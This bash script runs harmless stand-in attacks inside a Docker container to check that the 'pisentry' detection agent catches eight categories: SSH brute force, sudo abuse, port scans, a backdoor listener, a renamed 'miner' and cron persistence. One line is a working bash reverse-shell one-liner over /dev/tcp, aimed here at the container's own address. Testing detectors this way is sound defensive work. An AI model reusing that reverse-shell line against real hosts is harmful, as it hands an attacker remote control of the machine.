#!/usr/bin/env bash
# Container-based attack simulation for pisentry.
#
# Runs the agent in a python:3-slim container with file-mode logs and short
# detector intervals, then fires harmless stand-ins for the eight simulatable
# Top 10 categories (PS01, 02, 04, 05, 06, 07, 08, 09), exactly as
# scripts/simulate-attacks.sh does on a real host. It writes events.jsonl,
# report.json, metrics.txt and top10.json to an output directory and exits
# non-zero unless all eight categories fired.
#
# Nothing leaves the container: every IP in a log line is an RFC 5737
# documentation address, the "reverse shell" connects to the container's own
# interface, the "miner" is a renamed copy of sleep, and the cron drop-in is a
# comment. No root on the host is needed, only Docker.
#
#   make sim                       # builds the binary, then runs this
#   scripts/sim-container/sim.sh ./pisentry
#   OUT=/some/dir scripts/sim-container/sim.sh ./pisentry
#
# KEEP_UP=1 leaves the agent and the simulated services running after the run
# so an external Prometheus can scrape http://<container>:9817/metrics.
set -euo pipefail

IMAGE_PY=python:3-slim
CONTAINER=pisentry-sim
API=http://127.0.0.1:9817
TARGETS="PS01 PS02 PS04 PS05 PS06 PS07 PS08 PS09"

# --- in-container scenario ---------------------------------------------------

container_ip() {
  # Primary interface address, found without sending a packet: connecting a
  # UDP socket to a TEST-NET-1 address only sets the local routing source.
  python3 - <<'PY'
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
    s.connect(("192.0.2.1", 9))
    print(s.getsockname()[0])
finally:
    s.close()
PY
}

syslog() { # ident message file
  printf '%s %s %s: %s\n' "$(date '+%b %e %H:%M:%S')" pi-sim "$1" "$2" >>"$3"
}

fire_attacks() { # self-ip
  local ip="$1" i p
  # PS01 SSH brute force: 8 failures from one documentation-range source.
  for i in $(seq 1 8); do
    syslog sshd "Failed password for root from 203.0.113.66 port 4100${i} ssh2" /var/log/auth.log
  done
  # PS02 Suspicious login: a success from the same source right after.
  syslog sshd "Accepted password for root from 203.0.113.66 port 41999 ssh2" /var/log/auth.log
  # PS04 Privilege escalation: sudo by a user who is not in sudoers.
  syslog sudo "  mallory : user NOT in sudoers ; TTY=pts/9 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash" /var/log/auth.log
  # PS09 Port scan: 15 firewall drops, one source, many ports (documentation ranges).
  for p in 21 22 23 25 53 80 110 143 443 445 3306 3389 5432 6379 8080; do
    syslog kernel "[UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.23 DST=192.0.2.10 PROTO=TCP SPT=55555 DPT=${p} SYN" /var/log/kern.log
  done
  # PS07 Unexpected listener on a classic backdoor port.
  python3 -m http.server 31337 --bind 0.0.0.0 >/dev/null 2>&1 &
  BGPIDS+=("$!")
  # PS06 Cryptominer: a harmless copy of sleep under a known miner name.
  cp "$(command -v sleep)" /tmp/xmrig-pisentry-sim
  /tmp/xmrig-pisentry-sim 600 &
  BGPIDS+=("$!")
  # PS08 Reverse shell: bash with its stdio wired to a TCP socket on our own IP.
  python3 - >/dev/null 2>&1 <<'PY' &
import socket, time
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 4445))
s.listen(1)
c, _ = s.accept()
time.sleep(600)
PY
  BGPIDS+=("$!")
  sleep 1
  bash -c "exec 3<>/dev/tcp/${ip}/4445; exec bash -i <&3 >&3 2>&3" >/dev/null 2>&1 &
  BGPIDS+=("$!")
  # PS05 Persistence: a comment-only cron drop-in, created after the FIM baseline.
  mkdir -p /etc/cron.d
  printf '# pisentry simulation, safe to delete\n' >/etc/cron.d/pisentry-sim
}

count_fired() { # prints how many target categories have at least one event
  python3 - "${API}/api/top10?window=10m" "$TARGETS" <<'PY'
import json, sys, urllib.request
targets = set(sys.argv[2].split())
try:
    with urllib.request.urlopen(sys.argv[1], timeout=5) as r:
        data = json.load(r)
except Exception:
    print(0); raise SystemExit(0)
fired = {row["id"] for row in data.get("top10", []) if row.get("events", 0) > 0}
print(len(targets & fired))
PY
}

report_categories() {
  python3 - "${API}/api/top10?window=10m" "$TARGETS" <<'PY'
import json, sys, urllib.request
targets = sys.argv[2].split()
with urllib.request.urlopen(sys.argv[1], timeout=5) as r:
    data = json.load(r)
ev = {row["id"]: row.get("events", 0) for row in data.get("top10", [])}
for t in targets:
    print("  %s: %s (%d)" % (t, "fired" if ev.get(t, 0) > 0 else "MISSING", ev.get(t, 0)))
PY
}

wait_for_categories() { # timeout-seconds
  local timeout="$1" waited=0 n=0
  while [ "$waited" -lt "$timeout" ]; do
    n="$(count_fired 2>/dev/null || echo 0)"
    if [ "${n:-0}" -ge 8 ]; then return 0; fi
    sleep 5
    waited=$((waited + 5))
  done
  return 0
}

fetch() { # url dest
  python3 - "$1" "$2" <<'PY'
import sys, urllib.request
with urllib.request.urlopen(sys.argv[1], timeout=5) as r:
    body = r.read()
with open(sys.argv[2], "wb") as f:
    f.write(body)
PY
}

collect() {
  "$BIN" report -config "$CFG" -since 10m -json >"$OUT/report.json" 2>>"$OUT/agent.log" || true
  fetch "${API}/metrics" "$OUT/metrics.txt" || true
  fetch "${API}/api/top10?window=10m" "$OUT/top10.json" || true
}

cleanup_inside() {
  local p
  for p in "${BGPIDS[@]:-}"; do
    [ -n "$p" ] && kill "$p" 2>/dev/null || true
  done
  rm -f /etc/cron.d/pisentry-sim /tmp/xmrig-pisentry-sim 2>/dev/null || true
  [ -n "${AGENT:-}" ] && kill "$AGENT" 2>/dev/null || true
}

inside_main() {
  OUT=/out
  CFG=/sim/config.json
  BIN=/usr/local/bin/pisentry
  BGPIDS=()
  AGENT=""
  export PATH="/usr/local/bin:${PATH}"
  mkdir -p /var/lib/pisentry "$OUT"
  : >/var/log/auth.log
  : >/var/log/kern.log

  echo "[sim] starting agent; learning period, then attacks"
  "$BIN" run -config "$CFG" >"$OUT/events.jsonl" 2>"$OUT/agent.log" &
  AGENT=$!
  sleep 25

  local ip
  ip="$(container_ip)"
  echo "[sim] firing attacks (self ip ${ip})"
  fire_attacks "$ip"

  echo "[sim] waiting for detectors (up to 90s)"
  wait_for_categories 90

  collect
  local n
  n="$(count_fired)"
  echo "[sim] target categories fired: ${n}/8"
  report_categories
  echo "[sim] outputs in ${OUT}: events.jsonl report.json metrics.txt top10.json"

  if [ -n "${KEEP_UP:-}" ]; then
    echo "[sim] KEEP_UP set; agent and simulated services stay up"
    wait "$AGENT"
    return 0
  fi

  cleanup_inside
  if [ "${n}" -lt 8 ]; then
    echo "[sim] FAIL: fewer than 8 categories fired" >&2
    return 1
  fi
  echo "[sim] PASS: all 8 simulatable categories fired"
  return 0
}

# --- host orchestration ------------------------------------------------------

orchestrate() {
  local bin="${1:-}"
  if [ -z "$bin" ]; then
    echo "usage: scripts/sim-container/sim.sh /path/to/pisentry   (or: make sim)" >&2
    exit 2
  fi
  command -v docker >/dev/null 2>&1 || { echo "docker is required on the host" >&2; exit 2; }

  local bin_abs script_abs cfg_abs out
  bin_abs="$(cd "$(dirname "$bin")" && pwd)/$(basename "$bin")"
  script_abs="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
  cfg_abs="$(cd "$(dirname "$script_abs")" && pwd)/config.json"
  out="${OUT:-${TMPDIR:-/tmp}/pisentry-sim-out}"
  mkdir -p "$out"
  [ -f "$bin_abs" ] || { echo "binary not found: ${bin_abs}" >&2; exit 2; }

  echo "[sim] running agent in ${IMAGE_PY}; outputs -> ${out}"
  docker run --rm --name "${CONTAINER}-$$" \
    -e KEEP_UP="${KEEP_UP:-}" \
    -v "${bin_abs}:/usr/local/bin/pisentry:ro" \
    -v "${script_abs}:/sim/sim.sh:ro" \
    -v "${cfg_abs}:/sim/config.json:ro" \
    -v "${out}:/out" \
    "${IMAGE_PY}" bash /sim/sim.sh --inside
}

if [ "${1:-}" = "--inside" ]; then
  set +e
  inside_main
  rc=$?
  set -e
  exit "$rc"
fi
orchestrate "$@"
